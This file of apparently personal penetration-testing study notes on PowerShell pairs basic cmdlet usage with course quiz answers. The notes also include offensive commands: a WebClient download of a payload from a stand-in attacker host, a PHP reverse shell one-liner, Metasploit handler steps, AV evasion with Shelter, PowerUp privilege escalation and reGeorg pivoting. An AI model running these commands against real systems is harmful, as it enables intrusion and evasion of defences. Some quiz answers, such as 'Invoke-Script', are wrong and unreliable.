@@ -1,0 +1,287 @@
+Powershell
+---------
+Powershell is an interpreted scripting language
+
+32 bit version of powershell is in > C:\windows\sysWOW64\Windowspowershell
+
+If powershell is not recognized as cmdlet > add (C:\Windows\System32\WindowsPowerShell\v1.0\) in SystemPath Environment variable 
+
+To run the powershell script without having problems, we have to use Bypass or Unrestricted
+-------------------------------------------------------------------------------------------
+powershell.exe -ExecutionPolicy Bypass .\script.ps1
+powershell.exe -ExecutionPolicy Unrestricted .\script.ps1
+powershell.exe -ExecutionPolicy Unrestricted calc.exe (running calculator program)
+
+abbreviated parameter
+---------------------
+powershell.exe -ex Bypass .\script.ps1
+powershell.exe -ep Bypass .\script.ps1
+
+WindowStyle parameter (it hides the powershell window when used with hidden argument)
+-------------------------------------------------------------------------------------
+powershell.exe -WindowStyle Hidden .\script.ps1
+
+powershell.exe -w Hidden .\script.ps1
+powershell.exe -wi Hidden .\script.ps1
+
+Command parameter is used to specify a command or scriptblock to run
+---------------------------------------------------------------------
+powershell.exe -Command Get-Process
+powershell.exe -Command "& { Get-EventLog -LogName security } "
+
+EncodedCommand is used to execute base64 encoded command
+---------------------------------------------------------
+powershell.exe -EncodedCommand $encodedcommand
+
+powershell.exe -enco $encodedcommand
+powershell.exe -en $encodedcommand
+
+Powershell Profiles 
+--------------------
+Profiles are essentially scripts that run when the powershell executable is launched and can interfere with our operations so that 
+don't load any powershell profiles by using -Noprofile parameter
+
+powershell.exe -Noprofilee .\script.ps1
+
+If you want to change powershell version to run (-Version)
+-------------------------------------------------
+powershell.exe -Version 2
+
+Get-Help command is used to retrieve information about the specific cmdlet
+--------------------------------------------------------------------------
+Get-Help Get-Process 
+Get-Help Get-Process -Full
+Get-Help Get-Process -Online 
+
+Get-Command cmdlet is used to list all cmdlets,aliases,functions 
+-----------------------------------------------------------------
+Get-Command -Name *Firewall*
+
+Which operator is used for string concatenation in PowerShell? -- Plus Sign
+
+# Script: ConcatenateStrings.ps1
+
+# Define two strings
+$string1 = "Hello"
+$string2 = "World"
+
+# Concatenate the strings using the + operator
+$concatenatedString = $string1 + " " + $string2
+
+# Output the result
+Write-Output $concatenatedString
+
+Which PowerShell cmdlet is commonly used for retrieving system information such as running processes, services, and system properties? > Get-Service
+______________________________________________________________________________________________________________________________________________________________________
+Using Pipe
+-----------
+Get-Process | sort-object Unique | select-object processname,id,cpu
+
+using | format-list *
+----------------------
+e.g. In normal output of get-process, we know only (id,processname,cpu), but if you use 
+
+Get-process | format-list * (we know more information)
+
+To know chrome's processname,id,and cpu
+---------------------------------------
+Get-Process chrome | sort-object Unique | select-object processname,id,cpu
+
+To know chrome path
+-------------------
+Get-Process chrome | sort-object Unique | format-list path
+______________________________________________________________________________________________________________________________________________________________________
+Alias is an alternative name or shortcut for a cmdlet, function, script, or executable program
+-----------------------------------------------------------------------------------------------
+get-alias -definition get-process
+
+CommandType     Name                                               Version    Source
+-----------     ----                                               -------    ------
+Alias           gps -> Get-Process
+Alias           ps -> Get-Process
+
+Instead of using get-process, use gps is ok.
+e.g > gps chrome | sort-object Unique | select-object processname,id,CPU
+
+______________________________________________________________________________________________________________________________________________________________________
+Select-object
+--------------
+
+Another alias you'll see quite often is "select" when used in conjunction with other cmdlets in pipeline operations and is an alias for the "Select-Object" cmdlet.
+
+In this example, we're using the "Get-WmiObject" cmdlet, (used to return information about WMI objects) in conjunction with the "-class win32_operatingsystem" parameter and arguments, and then selecting (select) all (*) properties related to that WMI object class; this returns all information related to the current operating system.
+
+Get-wmiobject -class win32_operatingsystem | select -property *
+
+You can also filter 
+
+Get-wmiobject -class win32_operatingsystem | select -property * | select-object Version
+______________________________________________________________________________________________________________________________________________________________________
+By filtering descending order and starting word
+-----------------------------------------------
+Get-service "s*" | sort-object status -descending
+
+Export CSV
+----------
+get-wmiobject -class win32_operatingsystem | fl * | export-csv C:\Users\User\wmi.csv
+
+New-item parameter with -itemtype used to create new folder
+------------------------------------------------------------
+new-item lee -itemtype directory
+______________________________________________________________________________________________________________________________________________________________________
+powershell modules (.psm)
+-----------------
+> Get-module -listavailabe
+
+> import-module .\module.psm1
+
+Popular powershell exploitation framework > powersploit
+
+Which cmdlet is used to install a PowerShell module from an online repository? > install-module
+What is the purpose of a PowerShell module? > to define custom functions and cmdlets
+______________________________________________________________________________________________________________________________________________________________________
+Powershell scripts
+------------------
+using foreach()
+
+$services=get-service
+foreach ($result in $services){$result.displayname}
+
+foreach-object{} and where-object{}
+--------------------------------------
+It will display the get-service's displayname
+
+You can also write with ForEach-Object{} to create a foreach() loop
+
+> Get-service | foreach-object {$_.Name}
+
+Where-object allows us to select object
+---------------------------------------
+> Get-childitem C:\Powershell | where-object {$_.Name -match "pdf"}
+
+It will list get-childitem's name that matches with pdf
+
+Which cmdlet is commonly used to execute a PowerShell script from within another script? > Invoke-Script
+
+# Example: Using Invoke-Command to run a script locally
+>Invoke-Command -ScriptBlock { & "C:\Path\To\OtherScript.ps1" }
+
+# Example: Using Invoke-Command to run a script on a remote computer
+Invoke-Command -ComputerName RemoteComputerName -ScriptBlock { & "C:\Path\To\OtherScript.ps1" }
+
+What is the purpose of parameters in a PowerShell script? > To define variables that are passed to the script when it is executed
+______________________________________________________________________________________________________________________________________________________________________
+powershell Object
+-----------------
+In PowerShell, everything is treated as an object, which is a key aspect of its design. Objects in PowerShell are instances of .NET classes, and they have properties (data) and methods (actions) that can be accessed and manipulated.
+
+As an example of creating a webclient-download object based on a .NET class with the "New-Object" cmdlet, we can use the “Net.WebClient" .NET system class to download a file to a target system with the following code:
+
+PS C:\> $webclient = New-Object System.Net.WebClient
+PS C:\> $payload_url = "https://attacker_host/payload.exe"
+PS C:\> $file = "C:\ProgramData\payload.exe"
+PS C:\> $webclient.DownloadFile ($payload_url, $file)
+
+.DownloadFile is a method.
+____________________________________________________________________________________________________________________________________
+Which of the following is NOT a benefit of using PowerShell in penetration testing? > Ability to bypass network firewalls
+
+How does PowerShell contribute to the efficiency of penetration testing workflows? > By allowing for rapid development and execution of scripts
+____________________________________________________________________________________________________________________________________
+Starkiller
+----------
+Starkiller is a GUI version of PowerShell Empire. It can support Windows,Linux and MacOS eventhough powershell empire can support only Windows.
+
+What is a "stager" in the context of PowerShell Empire? > A payload for initial access
+____________________________________________________________________________________________________________________________________
+Crypters
+--------
+It encrypts the code or payload and decrypts the encoded code in memory. The decryption key/function is usually stored in a stub
+A stub is a small piece of code that is executed first. It serves as an intermediary to perform initial setup or preparation before the main program runs.
+____________________________________________________________________________________________________________________________________
+AV Evasion with Shelter
+-----------------------
+Need to install 
+
+1. Shelter
+2. wine 
+
+#sudo apt-get install shelter -y (Currently, shelter can inject only in Windows 32 bit application )
+
+If you want to install 32 bits software, you have to add i386 architecture
+--------------------------------------------------------------------------
+#sudo dpkg --add-architecture i386
+#sudo apt-get install wine32
+
+#sudo wine shelter.exe
+
+Can inject Windows binary (vncviewer.exe, nc.exe, etc..)
+
+What is the purpose of AMSI (Antimalware Scan Interface) in AV evasion with PowerShell? > To detect and block malicious PowerShell scripts based on their behavior
+____________________________________________________________________________________________________________________________________
+Privilege escalation with Powerup.ps1
+-------------------------------------
+
+PowerUp is a PowerShell script designed to facilitate discovering and exploiting privilege escalation vulnerabilities in Windows environments. 
+Penetration testers and red teamers commonly use it to identify weaknesses that could allow an attacker with limited privileges to elevate their access to a higher level, such as local administrator or system
+
+https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 (git clone) && upload in target system
+
+All the functions can be seen in github.
+
+>. .\Powerup.ps1 (Activate the script)
+>Invoke-Allchecks
+
+Which one of the following PowerUp functions can be used to check for the services that the current user can modify? > Get-ModifiableService
+
+Which PowerUp function can be used to check for unquoted service paths which could potentially allow for privilege escalation? > Get-ServiceUnquoted
+
+You can also use psexec.py to connect the target machine with the administrator
+
+#psexec.py administrator@10.0.20.64
+
+If administrator gives those service accessible, we can use those to connect to the administrator by using it's password
+
+psexec.py (smb-share && psexec utility)
+winrm (winrm.exe)
+evil-winrm (winrm.exe)
+____________________________________________________________________________________________________________________________________
+Privilege escalation with PrivescCheck.ps1
+------------------------------------------
+
+What feature of PrivescCheck is primarily used to identify outdated and potentially vulnerable software installed on a system? > Invoke-AuditInstalledPrograms
+
+Which function in PrivescCheck helps in identifying user privileges that could potentially be escalated by exploiting Windows services? > Invoke-ServiceAudit
+
+
+C:> powershell.exe -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
+C:> runas.exe /user:administrator cmd (Calling cmd with administrator privilege from PowerShell)
+____________________________________________________________________________________________________________________________________
+Pivoting with ReGeorg
+---------------------
+Git clone to that repo
+https://github.com/sensepost/reGeorg/tree/master
+
+php reverse shell code execute in php_webshell and listen with meterpreter
+--------------------------------------------------------------------------
+
+php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+meterpeter> use multi/handler
+          > set payload php/reverse_php
+          > set LHOST
+          > run
+
+1.Need to have file uploading function in website.
+2.Upload tunnel.php file
+3.python reGeorgSocksProxy.py -p 9050 -u http://192.139.178.3/public/tunnel.php (file uplading path)
+
+Pivoting is finished
+
+#proxychains nmap -sV -sC -Pn 192.168.22.3(internal IP) 
+____________________________________________________________________________________________________________________________________
+
+
+
+____________________________________________________________________________________________________________________________________
+
